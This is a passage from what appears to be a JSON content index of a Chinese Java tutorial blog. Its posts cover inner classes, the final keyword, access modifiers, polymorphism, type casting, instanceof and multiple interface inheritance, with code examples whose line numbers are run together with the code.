@Override public void method2() &#123; System.out.println(\"实现类覆盖重写了方法！222\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类的final问题","slug":"java00124局部内部类的final问题","date":"2020-03-13T13:12:18.000Z","updated":"2020-03-13T13:21:39.387Z","comments":true,"path":"2020/03/13/java00124局部内部类的final问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00124局部内部类的final问题/","excerpt":"","text":"java局部内部类的final问题 局部内部类，如果希望访问所在方法的局部变量，那么这个局部变量必须是【有效final的】。 备注： 从Java 8+开始，只要局部变量事实不变，那么final关键字可以省略。 原因： new出来的对象在堆内存当中。 局部变量是跟着方法走的，在栈内存当中。 方法运行结束之后，立刻出栈，局部变量就会立刻消失。 但是new出来的对象会在堆当中持续存在，直到垃圾回收消失。 12345678910111213141516package cn.itcast.day11.demo04;public class MyOuter &#123; public void methodOuter() &#123; int num = 10; // 所在方法的局部变量 class MyInner &#123; public void methodInner() &#123; System.out.println(num); &#125; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类定义","slug":"java00123局部内部类定义","date":"2020-03-12T14:58:22.000Z","updated":"2020-03-12T15:01:34.066Z","comments":true,"path":"2020/03/12/java00123局部内部类定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00123局部内部类定义/","excerpt":"","text":"java局部内部类定义 如果一个类是定义在一个方法内部的，那么这就是一个局部内部类。 “局部”：只有当前所属的方法才能使用它，出了这个方法外面就不能用了。 定义格式： 1234567修饰符 class 外部类名称 &#123; 修饰符 返回值类型 外部类方法名称(参数列表) &#123; class 局部内部类名称 &#123; // ... &#125; &#125;&#125; 小节一下类的权限修饰符： public &gt; protected &gt; (default) &gt; private 定义一个类的时候，权限修饰符规则： 外部类：public / (default) 成员内部类：public / protected / (default) / private 局部内部类：什么都不能写 123456789101112131415161718package cn.itcast.day11.demo04;class Outer &#123; public void methodOuter() &#123; class Inner &#123; // 局部内部类 int num = 10; public void methodInner() &#123; System.out.println(num); // 10 &#125; &#125; Inner inner = new Inner(); inner.methodInner(); &#125;&#125; 12345678910package cn.itcast.day11.demo04;public class DemoMain &#123; public static void main(String[] args) &#123; Outer obj = new Outer(); obj.methodOuter(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的同名变量访问","slug":"java00122内部类的同名变量访问","date":"2020-03-12T09:44:02.000Z","updated":"2020-03-12T14:57:39.341Z","comments":true,"path":"2020/03/12/java00122内部类的同名变量访问/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00122内部类的同名变量访问/","excerpt":"","text":"java内部类的同名变量访问 格式是： 外部类名称.this.外部类成员变量名 声明内部类对象: 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); 123456789101112131415161718192021package cn.itcast.day11.demo03;// 如果出现了重名现象，那么格式是：外部类名称.this.外部类成员变量名public class Outer &#123; int num = 10; // 外部类的成员变量 public class Inner /*extends Object*/ &#123; int num = 20; // 内部类的成员变量 public void methodInner() &#123; int num = 30; // 内部类方法的局部变量 System.out.println(num); // 局部变量，就近原则 System.out.println(this.num); // 内部类的成员变量 System.out.println(Outer.this.num); // 外部类的成员变量 &#125; &#125;&#125; 1234567891011package cn.itcast.day11.demo03;public class Demo02InnerClass &#123; public static void main(String[] args) &#123; // 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); Outer.Inner obj = new Outer().new Inner(); obj.methodInner(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的使用","slug":"java00121成员内部类的使用","date":"2020-03-12T09:36:26.000Z","updated":"2020-03-12T09:42:58.148Z","comments":true,"path":"2020/03/12/java00121成员内部类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00121成员内部类的使用/","excerpt":"","text":"java成员内部类的使用 如何使用成员内部类？ 有两种方式： 间接方式： 在外部类的方法当中，使用内部类；然后main只是调用外部类的方法。 直接方式，公式： 类名称 对象名 = new 类名称(); 【外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称();】 1234567891011121314151617package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Hearts heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的定义","slug":"java00120成员内部类的定义","date":"2020-03-12T09:33:33.000Z","updated":"2020-03-12T09:35:48.343Z","comments":true,"path":"2020/03/12/java00120成员内部类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00120成员内部类的定义/","excerpt":"","text":"java成员内部类的定义 成员内部类的定义格式： 12345678修饰符 class 外部类名称 &#123; 修饰符 class 内部类名称 &#123; // ... &#125; // ...&#125; 注意： 内用外，随意访问；外用内，需要内部类对象。 12345678910111213141516package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Heart heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的概念与分类","slug":"java00119内部类的概念与分类","date":"2020-03-12T09:30:07.000Z","updated":"2020-03-12T09:32:54.484Z","comments":true,"path":"2020/03/12/java00119内部类的概念与分类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00119内部类的概念与分类/","excerpt":"","text":"java内部类的概念与分类 如果一个事物的内部包含另一个事物，那么这就是一个类内部包含另一个类。 例如：身体和心脏的关系。又如：汽车和发动机的关系。 分类： 成员内部类 局部内部类（包含匿名内部类） 1234567package cn.itcast.day11.demo03;public class Demo01InnerClass &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java四种权限修饰符","slug":"java00118四种权限修饰符","date":"2020-03-12T07:59:46.000Z","updated":"2020-03-12T09:29:42.197Z","comments":true,"path":"2020/03/12/java00118四种权限修饰符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00118四种权限修饰符/","excerpt":"","text":"java四种权限修饰符 Java中有四种权限修饰符： public &gt; protected &gt; (default) &gt; private 同一个类（我自己） YES YES YES YES 同一个包（我邻居） YES YES YES NO 不同包子类（我儿子） YES YES NO NO 不同包非子类（陌生人） YES NO NO NO 注意事项： (default)并不是关键字“default”，而是根本不写。 sub包中的类 1234567891011package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class Stranger &#123; public void methodStrange() &#123; System.out.println(new MyClass().num); &#125;&#125; 123456789101112package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class MySon extends MyClass &#123; public void methodSon() &#123;// System.out.println(super.num); &#125;&#125; demo02包中的类 1234567891011package cn.itcast.day11.demo02;public class MyClass &#123; public int num = 10; public void method() &#123; System.out.println(num); &#125;&#125; 12345package cn.itcast.day11.demo02;public class Demo01Main &#123;&#125; 123456789package cn.itcast.day11.demo02;public class MyAnother &#123; public void anotherMethod() &#123;// System.out.println(new MyClass().num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员变量","slug":"java00117final关键字用于修饰成员变量","date":"2020-03-12T07:54:37.000Z","updated":"2020-03-12T07:57:43.442Z","comments":true,"path":"2020/03/12/java00117final关键字用于修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00117final关键字用于修饰成员变量/","excerpt":"","text":"java final关键字用于修饰成员变量 对于成员变量来说，如果使用final关键字修饰，那么这个变量也照样是不可变。 由于成员变量具有默认值，所以用了final之后必须手动赋值，不会再给默认值了。 对于final的成员变量，要么使用直接赋值，要么通过构造方法赋值。二者选其一。 必须保证类当中所有重载的构造方法，都最终会对final的成员变量进行赋值。 12345678910111213141516171819202122package cn.itcast.day11.demo01;public class Person &#123; private final String name/* = \"鹿晗\"*/; public Person() &#123; name = \"关晓彤\"; &#125; public Person(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125;// public void setName(String name) &#123;// this.name = name;// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰局部变量","slug":"java00116final关键字用于修饰局部变量","date":"2020-03-12T07:50:56.000Z","updated":"2020-03-12T07:54:01.844Z","comments":true,"path":"2020/03/12/java00116final关键字用于修饰局部变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00116final关键字用于修饰局部变量/","excerpt":"","text":"java final关键字用于修饰局部变量 对于基本类型来说，不可变说的是变量当中的数据不可改变 对于引用类型来说，不可变说的是变量当中的地址值不可改变 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package cn.itcast.day11.demo01;/*final关键字代表最终、不可改变的。常见四种用法：1. 可以用来修饰一个类2. 可以用来修饰一个方法3. 还可以用来修饰一个局部变量4. 还可以用来修饰一个成员变量 */public class Demo01Final &#123; public static void main(String[] args) &#123; int num1 = 10; System.out.println(num1); // 10 num1 = 20; System.out.println(num1); // 20 // 一旦使用final用来修饰局部变量，那么这个变量就不能进行更改。 // “一次赋值，终生不变” final int num2 = 200; System.out.println(num2); // 200// num2 = 250; // 错误写法！不能改变！// num2 = 200; // 错误写法！ // 正确写法！只要保证有唯一一次赋值即可 final int num3; num3 = 30; // 对于基本类型来说，不可变说的是变量当中的数据不可改变 // 对于引用类型来说，不可变说的是变量当中的地址值不可改变 Student stu1 = new Student(\"赵丽颖\"); System.out.println(stu1); System.out.println(stu1.getName()); // 赵丽颖 stu1 = new Student(\"霍建华\"); System.out.println(stu1); System.out.println(stu1.getName()); // 霍建华 System.out.println(\"===============\"); final Student stu2 = new Student(\"高圆圆\"); // 错误写法！final的引用类型变量，其中的地址不可改变// stu2 = new Student(\"赵又廷\"); System.out.println(stu2.getName()); // 高圆圆 stu2.setName(\"高圆圆圆圆圆圆\"); System.out.println(stu2.getName()); // 高圆圆圆圆圆圆 &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo01;public class Student &#123; private String name; public Student() &#123; &#125; public Student(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员方法","slug":"java00115final关键字用于修饰成员方法","date":"2020-03-12T07:38:55.000Z","updated":"2020-03-12T07:42:07.282Z","comments":true,"path":"2020/03/12/java00115final关键字用于修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00115final关键字用于修饰成员方法/","excerpt":"","text":"java final关键字用于修饰成员方法 当final关键字用来修饰一个方法的时候，这个方法就是最终方法，也就是不能被覆盖重写。 格式： 123修饰符 final 返回值类型 方法名称(参数列表) &#123; // 方法体&#125; 注意事项： 对于类、方法来说，abstract关键字和final关键字不能同时使用，因为矛盾。 123456789101112package cn.itcast.day11.demo01;public abstract class Fu &#123; public final void method() &#123; System.out.println(\"父类方法执行！\"); &#125; public abstract /*final*/ void methodAbs() ;&#125; 1234567891011121314package cn.itcast.day11.demo01;public class Zi extends Fu &#123; @Override public void methodAbs() &#123; &#125; // 错误写法！不能覆盖重写父类当中final的方法// @Override// public void method() &#123;// System.out.println(\"子类覆盖重写父类的方法！\");// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰类","slug":"java00114final关键字用于修饰类","date":"2020-03-12T07:31:37.000Z","updated":"2020-03-12T07:35:31.308Z","comments":true,"path":"2020/03/12/java00114final关键字用于修饰类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00114final关键字用于修饰类/","excerpt":"","text":"java final关键字用于修饰类 当final关键字用来修饰一个类的时候， 格式： 123public final class 类名称 &#123; // ...&#125; 含义： 当前这个类不能有任何的子类。（太监类） 注意： 一个类如果是final的，那么其中所有的成员方法都无法进行覆盖重写（因为没儿子。） 123456789package cn.itcast.day11.demo01;public final class MyClass /*extends Object*/ &#123; public void method() &#123; System.out.println(\"方法执行！\"); &#125;&#125; 12345package cn.itcast.day11.demo01;// 不能使用一个final类来作为父类public class MySubClass /*extends MyClass*/ &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字与四种用法","slug":"java00113final关键字与四种用法","date":"2020-03-12T07:26:50.000Z","updated":"2020-03-12T07:31:02.653Z","comments":true,"path":"2020/03/12/java00113final关键字与四种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00113final关键字与四种用法/","excerpt":"","text":"java final关键字与四种用法 final关键字代表最终、不可改变的。 常见四种用法： 可以用来修饰一个类 可以用来修饰一个方法 还可以用来修饰一个局部变量 还可以用来修饰一个成员变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java关键字读法","slug":"java00112关键字读法","date":"2020-03-11T14:51:47.000Z","updated":"2020-03-11T14:59:57.864Z","comments":true,"path":"2020/03/11/java00112关键字读法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00112关键字读法/","excerpt":"","text":"java关键字读法","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口多态","slug":"java00111接口多态","date":"2020-03-11T11:36:49.000Z","updated":"2020-03-11T11:46:56.254Z","comments":true,"path":"2020/03/11/java00111接口多态/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00111接口多态/","excerpt":"","text":"java接口多态 接口多态和类多态是一样的用法 定义格式: 123456789public interface 父接口&#123; //内容&#125;public class 类名A implements 父接口 &#123; //内容&#125;public class 类名B implements 父接口 &#123; //内容&#125; 使用格式: 父接口类型 接口对象名 = new 类名(); 1234567891011package xiaochenyan.top.demo003;public class DemoMain&#123; public static void main(String[] args) &#123; Computer cm = new Computer(); cm.open(); cm.local(new usbMouse()); cm.local(new usbKeyboard()); cm.close(); &#125;&#125; 123456package xiaochenyan.top.demo003;public interface USB&#123; public abstract void open(); public abstract void close();&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbKeyboard implements USB&#123; @Override public void open() &#123; System.out.println(\"打开键盘\"); &#125; @Override public void close() &#123; System.out.println(\"关闭键盘\"); &#125; public void qiaoJiJianPan()&#123; System.out.println(\"敲击键盘\"); &#125;&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbMouse implements USB&#123; @Override public void open() &#123; System.out.println(\"打开鼠标\"); &#125; @Override public void close() &#123; System.out.println(\"关闭鼠标\"); &#125; public void shuBiaoDianJi()&#123; System.out.println(\"鼠标点击\"); &#125;&#125; 123456789101112131415161718192021222324252627package xiaochenyan.top.demo003;public class Computer&#123; public void open()&#123; System.out.println(\"打开电脑\"); &#125; public void close()&#123; System.out.println(\"关闭电脑\"); &#125; //使用接口进行多态处理 public void local(USB obj) &#123; obj.open(); if(obj instanceof usbMouse)&#123; ((usbMouse) obj).shuBiaoDianJi(); &#125;else if(obj instanceof usbKeyboard)&#123; ((usbKeyboard) obj).qiaoJiJianPan(); &#125; obj.close(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java用instanceof关键字进行类型判断","slug":"java00109用instanceof关键字进行类型判断","date":"2020-03-11T09:15:30.000Z","updated":"2020-03-11T09:21:06.904Z","comments":true,"path":"2020/03/11/java00109用instanceof关键字进行类型判断/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00109用instanceof关键字进行类型判断/","excerpt":"","text":"java用instanceof关键字进行类型判断 如何才能知道一个父类引用的对象，本来是什么子类？ 格式： 对象 instanceof 类名称 这将会得到一个boolean值结果，也就是判断前面的对象能不能当做后面类型的实例。 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435package cn.itcast.day10.demo06;public class Demo02Instanceof &#123; public static void main(String[] args) &#123; Animal animal = new Dog(); // 本来是一只狗 animal.eat(); // 狗吃SHIT // 如果希望掉用子类特有方法，需要向下转型 // 判断一下父类引用animal本来是不是Dog if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; // 判断一下animal本来是不是Cat if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; giveMeAPet(new Dog()); &#125; public static void giveMeAPet(Animal animal) &#123; if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向下转型","slug":"java00108对象的向下转型","date":"2020-03-11T08:57:49.000Z","updated":"2020-03-11T09:19:41.252Z","comments":true,"path":"2020/03/11/java00108对象的向下转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00108对象的向下转型/","excerpt":"","text":"java对象的向下转型 向上转型一定是安全的，没有问题的，正确的。但是也有一个弊端： 对象一旦向上转型为父类，那么就无法调用子类原本特有的内容。 解决方案：用对象的向下转型【还原】。 格式 : 子类类型 子类对象名 = (子类类型)父类对象 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 123456789101112131415161718192021222324package cn.itcast.day10.demo06;public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向之类对象。 Animal animal = new Cat(); // 本来创建的时候是一只猫 animal.eat(); // 猫吃鱼// animal.catchMouse(); // 错误写法！ // 向下转型，进行“还原”动作 Cat cat = (Cat) animal; cat.catchMouse(); // 猫抓老鼠 // 下面是错误的向下转型 // 本来new的时候是一只猫，现在非要当做狗 // 错误写法！编译不会报错，但是运行会出现异常： // java.lang.ClassCastException，类转换异常 Dog dog = (Dog) animal; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向上转型","slug":"java00107对象的向上转型","date":"2020-03-11T08:44:08.000Z","updated":"2020-06-10T11:26:37.164Z","comments":true,"path":"2020/03/11/java00107对象的向上转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00107对象的向上转型/","excerpt":"","text":"java对象的向上转型 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo06; */public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向子类对象。 Animal animal = new Cat(); animal.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用多态的好处","slug":"java00106使用多态的好处","date":"2020-03-11T08:29:46.000Z","updated":"2020-03-11T08:43:15.011Z","comments":true,"path":"2020/03/11/java00106使用多态的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00106使用多态的好处/","excerpt":"","text":"java使用多态的好处","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员方法的使用特点","slug":"java00105多态中成员方法的使用特点","date":"2020-03-11T08:29:41.000Z","updated":"2020-03-11T11:33:06.491Z","comments":true,"path":"2020/03/11/java00105多态中成员方法的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00105多态中成员方法的使用特点/","excerpt":"","text":"java多态中成员方法的使用特点 在多态的代码当中，成员方法的访问规则是： ​ 看new的是谁，就优先用谁，没有则向上找。 口诀： 编译看左边，运行看右边。 对比一下： 成员变量： 编译看左边，运行还看左边。 成员方法： 编译看左边，运行看右边。 12345678910111213141516package cn.itcast.day10.demo05;public class Demo02MultiMethod &#123; public static void main(String[] args) &#123; Fu obj = new Zi(); // 多态 obj.method(); // 父子都有，优先用子 obj.methodFu(); // 子类没有，父类有，向上找到父类 // 编译看左边，左边是Fu，Fu当中没有methodZi方法，所以编译报错。// obj.methodZi(); // 错误写法！ &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员变量的使用特点","slug":"java00104多态中成员变量的使用特点","date":"2020-03-11T08:14:50.000Z","updated":"2020-03-11T08:22:24.544Z","comments":true,"path":"2020/03/11/java00104多态中成员变量的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00104多态中成员变量的使用特点/","excerpt":"","text":"java多态中成员变量的使用特点 访问成员变量的两种方式： 直接通过对象名称访问成员变量：看等号左边是谁，优先用谁，没有则向上找。 间接通过成员方法访问成员变量：看该方法属于谁，优先用谁，没有则向上找。 123456789101112131415161718package cn.itcast.day10.demo05;public class Demo01MultiField &#123; public static void main(String[] args) &#123; // 使用多态的写法，父类引用指向子类对象 Fu obj = new Zi(); System.out.println(obj.num); // 父：10// System.out.println(obj.age); // 错误写法！ System.out.println(\"=============\"); // 子类没有覆盖重写，就是父：10 // 子类如果覆盖重写，就是子：20 obj.showNum(); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的格式与使用","slug":"java00103多态的格式与使用","date":"2020-03-11T08:09:47.000Z","updated":"2020-03-11T08:14:13.229Z","comments":true,"path":"2020/03/11/java00103多态的格式与使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00103多态的格式与使用/","excerpt":"","text":"java多态的格式与使用 代码当中体现多态性，其实就是一句话：父类引用指向子类对象。 格式： 父类名称 对象名 = new 子类名称(); 或者： 接口名称 对象名 = new 实现类名称(); 12345678910111213package cn.itcast.day10.demo04;public class Demo01Multi &#123; public static void main(String[] args) &#123; // 使用多态的写法 // 左侧父类的引用，指向了右侧子类的对象 Fu obj = new Zi(); obj.method(); obj.methodFu(); &#125;&#125; 12345678910111213package cn.itcast.day10.demo04;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo04;public class Zi extends Fu &#123; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的概述","slug":"java00102多态的概述","date":"2020-03-11T08:06:25.000Z","updated":"2020-03-11T08:09:14.206Z","comments":true,"path":"2020/03/11/java00102多态的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00102多态的概述/","excerpt":"","text":"java多态的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口之间的多继承","slug":"java00110接口之间的多继承","date":"2020-03-11T07:57:13.000Z","updated":"2020-03-11T08:05:01.673Z","comments":true,"path":"2020/03/11/java00110接口之间的多继承/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00110接口之间的多继承/","excerpt":"","text":"java接口之间的多继承 类与类之间是单继承的。直接父类只有一个。 类与接口之间是多实现的。一个类可以实现多个接口。 接口与接口之间是多继承的。 注意事项： 多个父接口当中的抽象方法如果重复，没关系。 多个父接口当中的默认方法如果重复，那么子接口必须进行默认方法的覆盖重写，【而且带着default关键字】。 12345package cn.itcast.day10.demo03;public class Demo01Relations &#123;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"AAA\"); &#125;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"BBB\"); &#125;&#125; 123456789101112131415161718package cn.itcast.day10.demo03;/*这个子接口当中有几个方法？答：4个。methodA 来源于接口AmethodB 来源于接口BmethodCommon 同时来源于接口A和Bmethod 来源于我自己 */public interface MyInterface extends MyInterfaceA, MyInterfaceB &#123; public abstract void method(); @Override public default void methodDefault() &#123; &#125;&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo03;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method() &#123; &#125; @Override public void methodA() &#123; &#125; @Override public void methodB() &#123; &#125; @Override public void methodCommon() &#123; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承父类并实现多个接口","slug":"java00101继承父类并实现多个接口","date":"2020-03-10T12:49:17.000Z","updated":"2020-03-10T13:23:12.241Z","comments":true,"path":"2020/03/10/java00101继承父类并实现多个接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00101继承父类并实现多个接口/","excerpt":"","text":"java继承父类并实现多个接口 使用接口的时候，需要注意： 接口是没有静态代码块或者构造方法的。 12345678910111213141516package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; // 错误写法！接口不能有静态代码块// static &#123;//// &#125; // 错误写法！接口不能有构造方法// public MyInterfaceA() &#123;//// &#125;&#125; 一个类的直接父类是唯一的，但是一个类可以同时实现多个接口。 格式： 123public class MyInterfaceImpl implements MyInterfaceA, MyInterfaceB &#123; // 覆盖重写所有抽象方法&#125; 如果实现类所实现的多个接口当中，存在重复的抽象方法，那么只需要覆盖重写一次即可。 1234567891011121314151617181920package cn.itcast.day10.demo02;public abstract class 